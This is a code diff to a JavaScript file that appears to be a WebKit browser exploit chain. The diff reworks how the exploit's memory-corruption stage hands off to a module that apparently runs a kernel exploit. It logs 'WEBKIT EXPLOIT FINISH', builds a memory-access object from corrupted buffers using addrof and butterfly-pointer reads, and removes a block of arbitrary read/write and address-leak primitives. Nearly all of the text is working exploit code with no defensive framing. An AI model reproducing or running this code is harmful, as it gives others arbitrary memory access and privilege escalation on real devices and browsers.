@@ -10,7 +10,6 @@ var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
 
 function poc() {
-	
 	addEventListener('error', event => {
     const reason = event.error;
     alert(
@@ -426,23 +425,35 @@ var expl_slave = new DataView(shared_buf);
     m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
     m[7] = 1;
 
+log("WEBKIT EXPLOIT FINISH");
 
-import { Memory } from './module/mem.mjs';
-import { Int as Int64 } from './module/int64.mjs';
-import * as lapse from './lapse.mjs';
+ async function load_lapse() {
+//  const { Memory } = await import('./module/mem.mjs');
+//  const { Int: Int64 } = await import('./module/int64.mjs');
 
-async function load_lapse() {
- 
- const obj = { addr: null, 0: 0 };
 
+let mod = await import('./module/mem.mjs');
+  let imod = await import('./module/int64.mjs');
+
+  const Memory = mod.Memory;
+  const Int64 = imod.Int;
+	
+  const obj = { addr: null, 0: 0 };
+
+  
   const rawPtr = window.addrof(obj);
+//  alert("rawPtr = 0x" + rawPtr.toString(16));
+
   const btRaw = window.read_ptr_at(rawPtr + 8);
+ // alert("butterfly raw = 0x" + btRaw.toString(16));
+
 
   const obj_p = new Int64(rawPtr >>> 0, (rawPtr / 0x100000000) >>> 0);
-  const obj_bt = new Int64(btRaw >>> 0, (btRaw / 0x100000000) >>> 0);
+  const obj_bt = new Int64(btRaw  >>> 0, (btRaw  / 0x100000000) >>> 0);
 
   const off0x10 = new Int64(0x10, 0);
-
+// const master_b = new Uint32Array(new ArrayBuffer(1));  
+ // const slave_b  = new DataView   (new ArrayBuffer(1)); 
   new Memory(
     expl_master,
     expl_slave,
@@ -451,90 +462,13 @@ async function load_lapse() {
     obj_bt
   );
 
+	  import('./lapse.mjs'); 
+
  
-  lapse.kexploit();
 }
+  
 
  
-
-
-
-      load_lapse();
-     return;
-
-
-   
-
-
-    var prim = {
-        write8: function (addr, value) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            if (value instanceof int64) {
-                expl_slave[0] = value.low;
-                expl_slave[1] = value.hi;
-            } else {
-                expl_slave[0] = value;
-                expl_slave[1] = 0;
-            }
-        },
-        write4: function (addr, value) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            if (value instanceof int64) {
-                expl_slave[0] = value.low;
-            } else {
-                expl_slave[0] = value;
-            }
-        },
-        write2: function (addr, value) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            var tmp = expl_slave[0] & 0xFFFF0000;
-            if (value instanceof int64) {
-                expl_slave[0] = ((value.low & 0xFFFF) | tmp);
-            } else {
-                expl_slave[0] = ((value & 0xFFFF) | tmp);
-            }
-        },
-        write1: function (addr, value) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            var tmp = expl_slave[0] & 0xFFFFFF00;
-            if (value instanceof int64) {
-                expl_slave[0] = ((value.low & 0xFF) | tmp);
-            } else {
-                expl_slave[0] = ((value & 0xFF) | tmp);
-            }
-        },
-        read8: function (addr) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            return new int64(expl_slave[0], expl_slave[1]);
-        },
-        read4: function (addr) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            return expl_slave[0];
-        },
-        read2: function (addr) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            return expl_slave[0] & 0xFFFF;
-        },
-        read1: function (addr) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            return expl_slave[0] & 0xFF;
-        },
-        leakval: function (obj) {
-            obj_slave.obj = obj;
-            return new int64(obj_master[4], obj_master[5]);
-        }
-    };
-    window.p = prim;
-	
-
-	
-
+   load_lapse();
+ 
 }
